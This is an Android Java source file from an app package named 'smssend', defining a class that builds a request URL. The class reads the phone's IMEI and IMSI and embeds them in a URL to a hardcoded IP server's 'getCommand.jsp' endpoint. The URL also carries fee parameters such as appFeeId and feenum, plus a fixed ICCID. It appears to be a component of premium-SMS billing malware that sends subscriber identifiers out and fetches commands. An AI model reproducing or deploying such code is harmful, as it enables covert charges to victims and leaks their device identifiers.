package com.example.administrator.smssend.server1;

import android.content.Context;
import android.telephony.TelephonyManager;

import com.example.administrator.smssend.server.URLImp;

/**
 * Created by Administrator on 2016/6/23.
 */

public class FirstURL implements URLImp
{
    private final String mImei;
    private final String mImsi;
    private final String mUrl;
    private final String cpid = "103";
    private final String channelid = "3238";
    private final String appId = "2138";
    private final String appFeeId = "3194";
    private final String feenum = "200";
    public FirstURL(Context context)
    {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        mImei = telephonyManager.getDeviceId();
        mImsi = telephonyManager.getSubscriberId();

        mUrl = "http://120.25.220.193:8099/send/getCommand.jsp?type=1&cpid=" + cpid + "&channelId=" + channelid + "&appId=" + appId + "&appFeeId=" + appFeeId + "&feenum=" + feenum + "&imei=" + mImei + "&imsi=" + mImsi + "&netInfo=GPRS&osInfo=4.1&osModel=ZTE&iccid=89860090010671234669&clientIp=117.136.5.16&extra=";
    }

    @Override
    public String getUrl()
    {
        return mUrl;
    }
}
